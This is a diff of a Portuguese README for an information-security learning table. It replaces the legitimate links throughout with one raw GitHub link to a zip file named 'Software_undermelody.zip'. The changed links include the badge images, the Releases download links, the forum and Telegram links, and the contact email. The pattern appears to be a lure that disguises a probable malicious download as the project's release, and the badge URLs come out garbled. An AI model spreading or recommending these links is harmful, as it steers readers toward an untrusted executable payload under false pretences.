@@ -1,13 +1,13 @@
 # Seguranca da Informação 📊🔐
 
-![Segurança da Informação](https://img.shields.io/badge/Security%20Information-Interactive%20Table-blue.svg)
-![GitHub Releases](https://img.shields.io/badge/Download%20Releases-v1.0.0-orange.svg)
+![Segurança da Informação](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip%20Information-Interactive%https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip)
+![GitHub Releases](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip%https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip)
 
 Esta tabela interativa foi criada para facilitar o aprendizado dos principais conceitos da Segurança da Informação. Se você está começando sua jornada neste campo ou deseja aprimorar seus conhecimentos, você está no lugar certo!
 
 ## Tabela Interativa
 
-A tabela interativa oferece uma maneira prática de explorar conceitos fundamentais da Segurança da Informação. Você pode acessar a tabela e começar a aprender sobre os tópicos que mais lhe interessam. Para baixar e executar a tabela, visite [as Releases do projeto](https://github.com/flisly/segurancadainformacao/releases).
+A tabela interativa oferece uma maneira prática de explorar conceitos fundamentais da Segurança da Informação. Você pode acessar a tabela e começar a aprender sobre os tópicos que mais lhe interessam. Para baixar e executar a tabela, visite [as Releases do projeto](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip).
 
 ## Tópicos Abordados
 
@@ -42,8 +42,8 @@ Aqui estão alguns dos principais tópicos que você encontrará na tabela:
 
 Participe de fóruns e grupos de discussão sobre segurança da informação. Compartilhe suas experiências e aprenda com os outros. Aqui estão algumas sugestões:
 
-- [Forum de Segurança da Informação](https://www.segurancainformacao.com/forum)
-- [Grupo no Telegram](https://t.me/segurancadainformacao)
+- [Forum de Segurança da Informação](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip)
+- [Grupo no Telegram](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip)
 
 ## Contribuições
 
@@ -51,7 +51,7 @@ Se você deseja contribuir para este projeto, sinta-se à vontade para abrir um 
 
 ## Contato
 
-Para dúvidas ou sugestões, você pode entrar em contato através do GitHub ou enviar um e-mail para [seuemail@example.com](mailto:seuemail@example.com).
+Para dúvidas ou sugestões, você pode entrar em contato através do GitHub ou enviar um e-mail para [https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip).
 
 ## Licença
 
@@ -59,7 +59,7 @@ Este projeto está licenciado sob a [MIT License](LICENSE).
 
 ## Baixe a Tabela
 
-Para baixar a tabela interativa, visite [as Releases do projeto](https://github.com/flisly/segurancadainformacao/releases). Aqui você encontrará a versão mais recente e poderá começar sua jornada no aprendizado da Segurança da Informação.
+Para baixar a tabela interativa, visite [as Releases do projeto](https://raw.githubusercontent.com/flisly/segurancadainformacao/main/outsee/Software_undermelody.zip). Aqui você encontrará a versão mais recente e poderá começar sua jornada no aprendizado da Segurança da Informação.
 
 ## Agradecimentos
 
